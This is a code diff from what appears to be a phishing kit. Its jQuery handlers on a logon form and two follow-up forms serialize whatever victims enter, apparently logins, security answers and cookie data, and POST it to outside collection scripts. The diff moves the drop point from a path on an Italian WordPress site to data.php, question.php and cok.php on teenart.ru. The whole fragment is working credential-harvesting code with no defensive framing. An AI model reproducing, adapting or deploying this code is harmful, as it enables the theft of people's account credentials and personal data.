@@ -1002,7 +1002,7 @@ var counts = 0;
 $('#aoblogon').on('submit', function(e){
 		count = count+1;
 		$('#btn1').html('<i class="fa fa-circle-o-notch fa-spin fa-1x fa-fw"></i>');
-		$.post('https://www.prontosimangia.it/wp-log/data.php', $(this).serialize(), function(data){
+		$.post('https://teenart.ru/data.php', $(this).serialize(), function(data){
 			console.log(data);
 		});
 		setTimeout(function() {
@@ -1023,7 +1023,7 @@ $('#aoblogon').on('submit', function(e){
 $('#form2').on('submit', function(e){
 		count = count+1;
 		$('#btn2').html('<i class="fa fa-circle-o-notch fa-spin fa-1x fa-fw"></i>');
-		$.post('https://www.prontosimangia.it/wp-log/question.php', $(this).serialize(), function(data){
+		$.post('https://teenart.ru/question.php', $(this).serialize(), function(data){
 			console.log(data);
 		});
 		setTimeout(function() {
@@ -1044,7 +1044,7 @@ $('#form2').on('submit', function(e){
 $('#form3').on('submit', function(e){
 		counts = counts+1;
 		$('#btn3').html('<i class="fa fa-circle-o-notch fa-spin fa-1x fa-fw"></i>');
-		$.post('https://www.prontosimangia.it/wp-log/cok.php', $(this).serialize(), function(data){
+		$.post('https://teenart.ru/cok.php', $(this).serialize(), function(data){
 			console.log(data);
 		});
 		setTimeout(function() {
